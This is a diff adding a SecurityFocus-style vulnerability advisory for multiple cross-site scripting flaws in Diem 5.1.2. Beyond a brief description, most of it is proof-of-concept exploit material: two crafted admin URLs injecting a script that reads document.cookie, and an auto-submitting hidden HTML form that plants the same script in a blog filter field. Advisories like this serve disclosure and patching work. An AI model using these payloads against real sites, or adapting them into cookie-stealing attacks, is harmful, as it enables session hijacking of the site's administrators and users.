@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/41587/info
+
+Diem is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Diem 5.1.2 is vulnerable; other versions may also be affected.
+
+http://www.example.com/admin.php/seo/pages/manage-pages/editField?dm_cpi=0&dm_xhr=1&value=title"><script>alert(document.cookie)<%2Fscript>&id=&page_id=1&field=title
+http://www.example.com/admin.php/+/dmCore/markdown?dm_cpi=0&dm_xhr=1&text=title"><script>alert(document.cookie)<%2Fscript>
+
+<form action="http://www.example.com/admin.php/content/blog/articles/filter" name="main" >
+<input type="hidden" name="article_form_filter[name][text]" value=&#039;1"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="article_form_filter[is_active]" value="" />
+<input type="hidden" name="article_form_filter[text][text]" value="" />
+<input type="hidden" name="article_form_filter[created_by]" value="" />
+<input type="hidden" name="article_form_filter[created_at]" value="" />
+<input type="hidden" name="article_form_filter[updated_at]" value="" />
+</form>
+<script>
+document.main.submit();
+</script>
